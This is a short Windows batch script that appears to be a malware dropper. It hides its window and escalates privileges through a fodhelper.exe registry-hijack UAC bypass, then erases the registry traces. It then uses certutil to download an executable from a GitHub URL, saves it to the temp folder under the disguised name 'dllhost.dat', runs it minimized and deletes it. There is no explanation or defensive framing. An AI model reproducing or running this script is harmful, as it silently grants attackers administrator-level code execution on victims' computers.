@echo off
if not "%~1"=="MINIMIZED" (
    start "" /min cmd /c "%~f0" MINIMIZED %*
    exit /b
)

net session >nul 2>&1
if %errorLevel% == 0 ( goto :runAsAdmin ) else ( goto :elevate )

:elevate
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "cmd /c \"%~f0\" MINIMIZED" /f >nul 2>&1
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /d "" /f >nul 2>&1
start "" fodhelper.exe >nul 2>&1
timeout /t 3 >nul
reg delete "HKCU\Software\Classes\ms-settings" /f >nul 2>&1
exit /b

:runAsAdmin
set "exeUrl=https://github.com/clickmaggot-bit/my-repository/raw/refs/heads/main/dummy.exe"
set "exePath=%TEMP%\dllhost.dat"
certutil -urlcache -split -f "%exeUrl%" "%exePath%" >nul 2>&1
start "" /min "%exePath%"
timeout /t 2 >nul
del "%exePath%" >nul 2>&1
exit